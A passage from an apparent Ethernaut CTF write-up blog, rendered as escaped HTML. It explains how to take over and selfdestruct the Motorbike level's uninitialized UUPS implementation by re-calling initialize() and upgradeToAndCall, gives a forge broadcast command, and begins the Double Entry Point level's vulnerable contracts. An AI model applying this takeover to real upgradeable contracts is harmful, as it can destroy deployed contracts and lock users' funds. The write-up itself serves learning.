&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address newImplementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory data
&lt;&#x2F;span&gt;&lt;span&gt;    ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Initial upgrade and setup call
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_setImplementation&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;newImplementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Call failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Stores a new address in the EIP1967 implementation slot.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_setImplementation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address newImplementation&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;private &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(Address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isContract&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ERC1967: new implementation is not a contract&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        AddressSlot storage r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;r_slot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_IMPLEMENTATION_SLOT
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;newImplementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Would you be able to selfdestruct its engine and make the motorbike unusable ?&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.&lt;&#x2F;li&gt;
&lt;li&gt;This time no storage collison is happened.&lt;&#x2F;li&gt;
&lt;li&gt;We need to change the &lt;code&gt;updrader&lt;&#x2F;code&gt; of the Engine contract and &lt;code&gt;selfdestruct&lt;&#x2F;code&gt; the Engine contract.&lt;&#x2F;li&gt;
&lt;li&gt;I dont see any function that selfdestructs Engine contract. So, we have to write an Attack contract which has the selfdestruct function and change the implementation address.&lt;&#x2F;li&gt;
&lt;li&gt;We see only one time the &lt;code&gt;upgrader&lt;&#x2F;code&gt; was assigned inside Engine contract, that is inside &lt;code&gt;initialize()&lt;&#x2F;code&gt; function. And this initialize function was called inside the constructor of the Motobike.&lt;&#x2F;li&gt;
&lt;li&gt;But observe that this call was done using &lt;code&gt;delegatecall&lt;&#x2F;code&gt;, which is done in the context of the Motorbike. Not the Engine contract.&lt;&#x2F;li&gt;
&lt;li&gt;This means the &lt;code&gt;initialize()&lt;&#x2F;code&gt; function can be called again as the &lt;code&gt;intializer&lt;&#x2F;code&gt; modfier not updated.&lt;&#x2F;li&gt;
&lt;li&gt;By calling &lt;code&gt;intialize()&lt;&#x2F;code&gt; we will become the updrader of the Engine contract.&lt;&#x2F;li&gt;
&lt;li&gt;Now, we can update the implementation addres by calling &lt;code&gt;upgradeToAndCall()&lt;&#x2F;code&gt; function and pass the data as the signature of the &lt;code&gt;destructEngine()&lt;&#x2F;code&gt; function to be called by the Engine contract.&lt;&#x2F;li&gt;
&lt;li&gt;This will destruct the Engine contract, because the call was done using &lt;code&gt;delegatecall&lt;&#x2F;code&gt; so the storage of the Engine will be affected.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;MotorbikeSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;MotorbikeSolve.s.sol:MotorbikeSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;26-double-entry-point&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#26-double-entry-point&quot; aria-label=&quot;Anchor link for: 26-double-entry-point&quot;&gt;26 Double Entry Point&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;DoubleEntryPoint.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;DelegateERC20 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address origSender&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;IDetectionBot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata msgData&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;IForta &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address detectionBotAddress&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata msgData&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Forta is IForta {
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;IDetectionBot) public usersDetectionBots&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256) public botRaisedAlerts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address detectionBotAddress&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      usersDetectionBots[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(detectionBotAddress)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata msgData&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(usersDetectionBots[user]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;usersDetectionBots[user]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msgData) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(usersDetectionBots[user]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      botRaisedAlerts[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract CryptoVault {
&lt;&#x2F;span&gt;&lt;span&gt;    address public sweptTokensRecipient&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public underlying&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address recipient) {
&lt;&#x2F;span&gt;&lt;span&gt;        sweptTokensRecipient &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;recipient&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setUnderlying&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address latestToken&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(underlying) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Already set&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        underlying &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(latestToken)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    ...
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sweepToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;IERC20 token&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;underlying&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can&amp;#39;t transfer underlying token&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(sweptTokensRecipient&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
